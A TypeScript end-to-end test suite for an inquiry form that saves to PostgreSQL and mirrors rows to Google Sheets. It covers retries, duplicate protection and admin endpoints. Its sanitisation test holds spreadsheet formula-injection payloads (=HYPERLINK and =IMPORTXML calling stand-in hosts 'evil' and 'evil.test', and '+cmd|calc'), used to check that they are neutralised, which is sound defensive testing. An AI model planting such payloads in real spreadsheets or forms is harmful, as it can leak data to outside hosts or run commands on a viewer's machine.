/**
 * End-to-end tests for the Google Sheets inquiry mirror.
 * Runs the real Express app against a real PostgreSQL database (DATABASE_URL),
 * with an in-memory fake standing in for Google so failures can be injected.
 *
 *   DATABASE_URL=postgresql://user:pass@localhost:5432/nookk_test npm test
 *   (run `npx prisma migrate deploy` against that database first)
 *
 * WARNING: deletes every row in `inquiries`. For safety it refuses to run
 * unless the database name contains "test".
 */
import { after, before, beforeEach, describe, it } from 'node:test'
import assert from 'node:assert/strict'
import type { AddressInfo } from 'node:net'
import type { Server } from 'node:http'
import bcrypt from 'bcryptjs'
import { createApp } from '../src/app'
import { env } from '../src/config/env'
import { prisma } from '../src/lib/prisma'
import type { SheetCell, SheetsGateway } from '../src/lib/googleSheets'
import {
  attemptSync,
  MAX_ATTEMPTS,
  requeueFailedSyncs,
  runPendingSync,
  setSheetsGatewayForTesting,
} from '../src/modules/inquiries/inquiries.sheetsSync'
import { buildInquiryRow, formatSubmissionDate, sanitizeCell } from '../src/modules/inquiries/inquiries.sheets'

class FakeSheet implements SheetsGateway {
  rows: SheetCell[][] = []
  prepareError: Error | null = null
  appendError: Error | null = null
  loseNextResponse = false // append lands in the "sheet" but the caller sees an error
  appendCalls = 0
  isConfigured = () => true
  async prepare() {
    if (this.prepareError) throw this.prepareError
  }
  async hasRow(id: string) {
    return this.rows.some((r) => r[0] === id)
  }
  async appendRow(row: SheetCell[]) {
    this.appendCalls++
    if (this.appendError) throw this.appendError
    await new Promise((r) => setTimeout(r, 15)) // widen race windows
    this.rows.push(row)
    if (this.loseNextResponse) {
      this.loseNextResponse = false
      throw new Error('socket hang up')
    }
  }
}

const googleError = (status: number, message: string) => Object.assign(new Error(message), { code: status })

const full = {
  name: 'Jane Doe',
  email: 'jane@example.com',
  phone: '+91 98765 43210',
  projectType: 'Space Planning',
  budget: '₹10 Lakh – ₹25 Lakh',
  areaSqFt: '1200', // the form submits a string; backend coerces
  message: 'We would like to redesign our 3BHK apartment.',
}

let server: Server
let base = ''
let sheet: FakeSheet

const post = (body: unknown) =>
  fetch(`${base}/api/inquiries`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) })

before(async () => {
  const dbName = new URL(env.DATABASE_URL).pathname
  if (!/test/i.test(dbName)) {
    throw new Error(`Refusing to run: these tests wipe the inquiries table and DATABASE_URL database "${dbName}" does not look like a test DB.`)
  }
  server = createApp().listen(0)
  await new Promise((r) => server.once('listening', r))
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`
})
after(async () => {
  server.close()
  setSheetsGatewayForTesting(null)
  await prisma.$disconnect()
})
beforeEach(async () => {
  await prisma.inquiry.deleteMany()
  sheet = new FakeSheet()
  setSheetsGatewayForTesting(sheet)
})

describe('happy path', () => {
  it('saves to PostgreSQL AND appends one correctly-mapped row to the sheet', async () => {
    const res = await post(full)
    assert.equal(res.status, 201)
    const json: any = await res.json()
    assert.equal(json.success, true)
    assert.match(json.message, /Thank you/)

    const db = await prisma.inquiry.findMany()
    assert.equal(db.length, 1)
    assert.equal(db[0].sheetsSyncStatus, 'SYNCED')
    assert.equal(db[0].sheetsLastError, null)
    assert.ok(db[0].sheetsSyncedAt)

    assert.equal(sheet.rows.length, 1)
    const [id, date, name, email, phone, type, area, budget, message, status] = sheet.rows[0]
    assert.equal(id, db[0].id) // A Submission ID
    assert.match(String(date), /^\d{2} \w{3} \d{4}, \d{2}:\d{2} (AM|PM) IST$/) // B
    assert.equal(name, 'Jane Doe') // C
    assert.equal(email, 'jane@example.com') // D
    assert.equal(phone, '+91 98765 43210') // E (leading + preserved)
    assert.equal(type, 'Space Planning') // F
    assert.equal(area, 1200) // G numeric
    assert.equal(budget, '₹10 Lakh – ₹25 Lakh') // H
    assert.equal(message, full.message) // I
    assert.equal(status, 'NEW') // J
    assert.equal(sheet.rows[0].length, 10)
  })

  it('does not leak sync internals or the dedupe key in the public response', async () => {
    const json: any = await (await post(full)).json()
    for (const key of ['submissionKey', 'sheetsSyncStatus', 'sheetsLastError', 'sheetsSyncAttempts'])
      assert.equal(key in json.data, false, `${key} leaked`)
    assert.equal(json.data.name, 'Jane Doe') // existing fields intact
  })

  it('empty optional fields become blank cells, not errors', async () => {
    const res = await post({ name: 'Raj Patel', email: 'raj@example.com', phone: '', budget: '', message: 'Need help with a studio flat.' })
    assert.equal(res.status, 201)
    const row = sheet.rows[0]
    assert.deepEqual([row[4], row[5], row[6], row[7]], ['', '', '', ''])
    assert.equal(row[2], 'Raj Patel')
  })

  it('multiple submissions each create their own row, in order', async () => {
    for (const n of ['Asha', 'Bilal', 'Chitra']) {
      assert.equal((await post({ ...full, name: `${n} Test`, email: `${n}@example.com` })).status, 201)
    }
    assert.deepEqual(sheet.rows.map((r) => r[2]), ['Asha Test', 'Bilal Test', 'Chitra Test'])
    assert.equal(new Set(sheet.rows.map((r) => r[0])).size, 3)
    assert.equal(await prisma.inquiry.count({ where: { sheetsSyncStatus: 'SYNCED' } }), 3)
  })

  it('still rejects invalid input exactly as before', async () => {
    const res = await post({ name: 'A', email: 'nope', message: 'short' })
    assert.equal(res.status, 400)
    assert.equal(await prisma.inquiry.count(), 0)
    assert.equal(sheet.rows.length, 0)
  })
})

describe('duplicate protection', () => {
  it('identical submission sent twice (double-click / retry) creates ONE inquiry and ONE sheet row', async () => {
    const [a, b] = await Promise.all([post(full), post(full)]) // concurrent, worst case
    assert.equal(a.status, 201)
    assert.equal(b.status, 201)
    assert.equal(await prisma.inquiry.count(), 1)
    assert.equal(sheet.rows.length, 1)
    const again = await post(full)
    assert.equal(again.status, 201)
    assert.equal(await prisma.inquiry.count(), 1)
  })

  it('same person, different message is NOT treated as a duplicate', async () => {
    await post(full)
    await post({ ...full, message: 'A completely different project request.' })
    assert.equal(await prisma.inquiry.count(), 2)
    assert.equal(sheet.rows.length, 2)
  })

  it('concurrent attempts on one inquiry append exactly once (lease)', async () => {
    sheet.prepareError = googleError(503, 'down')
    await post(full) // leaves it PENDING
    sheet.prepareError = null
    await prisma.inquiry.updateMany({ data: { sheetsNextAttemptAt: null } })
    const { id } = (await prisma.inquiry.findFirstOrThrow())
    await Promise.all([attemptSync(id), attemptSync(id), attemptSync(id)])
    assert.equal(sheet.rows.length, 1)
    assert.equal(sheet.appendCalls, 1)
  })
})

describe('Google failures never lose or duplicate an inquiry', () => {
  it('auth failure: visitor still gets success, inquiry kept, failure recorded, nothing leaked', async () => {
    sheet.prepareError = googleError(403, 'The caller does not have permission')
    const res = await post(full)
    assert.equal(res.status, 201)
    const body = JSON.stringify(await res.json())
    assert.ok(!/permission|Google|403|sheets/i.test(body), 'Google error leaked to visitor: ' + body)

    const row = await prisma.inquiry.findFirstOrThrow()
    assert.equal(row.sheetsSyncStatus, 'PENDING') // honest: NOT synced
    assert.equal(row.sheetsSyncAttempts, 1)
    assert.match(row.sheetsLastError ?? '', /403/)
    assert.ok(row.sheetsNextAttemptAt && row.sheetsNextAttemptAt > new Date()) // backing off
    assert.equal(row.sheetsSyncedAt, null)
    assert.equal(sheet.rows.length, 0)
  })

  it('retry worker syncs it once Google recovers (and respects backoff until then)', async () => {
    sheet.appendError = googleError(503, 'Service unavailable')
    await post(full)
    assert.equal((await runPendingSync()).synced, 0) // still backing off -> not attempted
    assert.equal(sheet.appendCalls, 1)

    sheet.appendError = null
    await prisma.inquiry.updateMany({ data: { sheetsNextAttemptAt: new Date(Date.now() - 1000) } }) // backoff elapsed
    const result = await runPendingSync()
    assert.equal(result.synced, 1)
    const row = await prisma.inquiry.findFirstOrThrow()
    assert.equal(row.sheetsSyncStatus, 'SYNCED')
    assert.equal(row.sheetsLastError, null)
    assert.equal(sheet.rows.length, 1)
    assert.equal(await prisma.inquiry.count(), 1) // no duplicate DB rows from retrying
  })

  it('lost response (append landed, caller saw an error): retry does NOT add a second row', async () => {
    sheet.loseNextResponse = true
    await post(full)
    assert.equal(sheet.rows.length, 1) // it did land
    assert.equal((await prisma.inquiry.findFirstOrThrow()).sheetsSyncStatus, 'PENDING') // but we didn't know

    await prisma.inquiry.updateMany({ data: { sheetsNextAttemptAt: new Date(Date.now() - 1000) } })
    await runPendingSync()
    assert.equal(sheet.rows.length, 1, 'duplicate row appended on retry')
    assert.equal(sheet.appendCalls, 1)
    assert.equal((await prisma.inquiry.findFirstOrThrow()).sheetsSyncStatus, 'SYNCED')
  })

  it('crashed attempt: expired lease is picked up, still no duplicate', async () => {
    await post(full)
    const { id } = await prisma.inquiry.findFirstOrThrow()
    await prisma.inquiry.update({ where: { id }, data: { sheetsSyncStatus: 'PENDING', sheetsNextAttemptAt: new Date(Date.now() + 60_000) } })
    assert.equal(await attemptSync(id), 'skipped') // lease still held -> hands off
    await prisma.inquiry.update({ where: { id }, data: { sheetsNextAttemptAt: new Date(Date.now() - 1) } })
    await attemptSync(id)
    assert.equal(sheet.rows.length, 1) // row from the first (successful) run is found, not re-added
  })

  it(`gives up after ${MAX_ATTEMPTS} attempts (FAILED) and is re-queued by requeueFailedSyncs`, async () => {
    sheet.prepareError = googleError(403, 'nope')
    await post(full)
    const { id } = await prisma.inquiry.findFirstOrThrow()
    for (let i = 1; i < MAX_ATTEMPTS; i++) {
      await prisma.inquiry.update({ where: { id }, data: { sheetsNextAttemptAt: null } })
      await attemptSync(id)
    }
    const failed = await prisma.inquiry.findUniqueOrThrow({ where: { id } })
    assert.equal(failed.sheetsSyncStatus, 'FAILED')
    assert.equal(failed.sheetsSyncAttempts, MAX_ATTEMPTS)
    assert.equal(await attemptSync(id), 'skipped') // FAILED rows aren't retried automatically

    sheet.prepareError = null // "credentials fixed + server restarted"
    assert.equal(await requeueFailedSyncs(), 1)
    assert.equal((await runPendingSync()).synced, 1)
    assert.equal((await prisma.inquiry.findUniqueOrThrow({ where: { id } })).sheetsSyncStatus, 'SYNCED')
    assert.equal(sheet.rows.length, 1)
  })

  it('backlog is flushed oldest-first; a systemic failure stops the pass after one attempt', async () => {
    sheet.prepareError = googleError(503, 'outage')
    for (const n of ['One', 'Two', 'Three']) await post({ ...full, name: `${n} Person`, email: `${n}@x.com` })
    await prisma.inquiry.updateMany({ data: { sheetsNextAttemptAt: null, sheetsSyncAttempts: 0 } })
    const before = sheet.appendCalls
    const r = await runPendingSync()
    assert.equal(r.failed, 1) // stopped after first failure
    assert.equal(await prisma.inquiry.count({ where: { sheetsSyncAttempts: 1 } }), 1)
    assert.equal(sheet.appendCalls, before)

    sheet.prepareError = null
    await prisma.inquiry.updateMany({ data: { sheetsNextAttemptAt: null } })
    assert.equal((await runPendingSync()).synced, 3)
    assert.deepEqual(sheet.rows.map((r) => r[2]), ['One Person', 'Two Person', 'Three Person'])
  })
})

describe('unconfigured Google Sheets', () => {
  it('inquiries still save; they stay PENDING with no attempts burned', async () => {
    setSheetsGatewayForTesting({ ...sheet, isConfigured: () => false } as SheetsGateway)
    const res = await post(full)
    assert.equal(res.status, 201)
    const row = await prisma.inquiry.findFirstOrThrow()
    assert.equal(row.sheetsSyncStatus, 'PENDING')
    assert.equal(row.sheetsSyncAttempts, 0)
  })
})

describe('sanitisation', () => {
  it('neutralises formula injection in every free-text column', async () => {
    const res = await post({
      name: '=HYPERLINK("http://evil","x")',
      email: 'ok@example.com',
      phone: '@SUM(1+1)',
      projectType: '+cmd|calc',
      budget: '-2+3',
      message: '=IMPORTXML("http://evil.test","//a")',
    })
    assert.equal(res.status, 201)
    const r = sheet.rows[0]
    assert.equal(r[2], `'=HYPERLINK("http://evil","x")`)
    assert.equal(r[4], "'@SUM(1+1)")
    assert.equal(r[5], "'+cmd|calc")
    assert.equal(r[7], "'-2+3")
    assert.equal(r[8], `'=IMPORTXML("http://evil.test","//a")`)
    // DB keeps the original text untouched
    assert.equal((await prisma.inquiry.findFirstOrThrow()).message, '=IMPORTXML("http://evil.test","//a")')
  })

  it('unit: leaves safe text and real phone numbers alone; truncates oversize cells', () => {
    assert.equal(sanitizeCell('hello = world'), 'hello = world')
    assert.equal(sanitizeCell('  =1+1'), "'  =1+1")
    assert.equal(sanitizeCell(undefined), '')
    assert.equal(sanitizeCell('+91 98765 43210', { phone: true }), '+91 98765 43210')
    assert.equal(sanitizeCell('+91 98765 43210'), "'+91 98765 43210") // only phone column is exempt
    assert.equal(sanitizeCell('+1+cmd', { phone: true }), "'+1+cmd")
    const huge = sanitizeCell('x'.repeat(60_000))
    assert.ok(huge.length <= 49_000 && huge.endsWith('admin dashboard]'))
  })

  it('unit: submission date is India time', () => {
    assert.equal(formatSubmissionDate(new Date('2026-11-24T13:10:00Z')), '24 Nov 2026, 06:40 PM IST')
    assert.equal(formatSubmissionDate(new Date('2026-01-01T18:45:00Z')), '02 Jan 2026, 12:15 AM IST') // crosses midnight
  })

  it('unit: very long message does not break row building', () => {
    const row = buildInquiryRow({
      id: 'x', createdAt: new Date(), name: 'N N', email: 'e@e.co', phone: null, projectType: null,
      areaSqFt: null, budgetRange: null, message: 'm'.repeat(80_000), status: 'NEW',
    })
    assert.equal(String(row[8]).length <= 49_000, true)
  })
})

describe('admin inquiries (existing functionality)', () => {
  it('login, list, filter by status and update status all still work', async () => {
    await prisma.user.deleteMany({ where: { username: 'sheets-test-admin' } })
    await prisma.user.create({
      data: { name: 'T', username: 'sheets-test-admin', email: 'sheets-test-admin@example.com', password: await bcrypt.hash('Admin@12345', 4), role: 'ADMIN' },
    })
    await post(full)
    await post({ ...full, name: 'Second Person', email: 'second@example.com' })

    const login: any = await (await fetch(`${base}/api/auth/login`, {
      method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ username: 'sheets-test-admin', password: 'Admin@12345' }),
    })).json()
    const token = login.data.token
    assert.ok(token, 'no token: ' + JSON.stringify(login))
    const auth = { authorization: `Bearer ${token}`, 'content-type': 'application/json' }

    const list: any = await (await fetch(`${base}/api/admin/inquiries?page=1&limit=20`, { headers: auth })).json()
    assert.equal(list.success, true)
    assert.equal(list.data.length, 2)
    assert.equal(list.meta.total, 2)
    assert.equal(list.data[0].name, 'Second Person') // newest first, as before
    assert.equal('submissionKey' in list.data[0], false)
    assert.equal(list.data[0].sheetsSyncStatus, 'SYNCED') // sync state visible to admins

    const id = list.data[0].id
    const upd: any = await (await fetch(`${base}/api/admin/inquiries/${id}`, { method: 'PATCH', headers: auth, body: JSON.stringify({ status: 'CONTACTED' }) })).json()
    assert.equal(upd.data.status, 'CONTACTED')
    assert.equal('submissionKey' in upd.data, false)

    const filtered: any = await (await fetch(`${base}/api/admin/inquiries?status=CONTACTED`, { headers: auth })).json()
    assert.equal(filtered.data.length, 1)

    const noAuth = await fetch(`${base}/api/admin/inquiries`)
    assert.equal(noAuth.status, 401)
    await prisma.user.deleteMany({ where: { username: 'sheets-test-admin' } })
  })
})
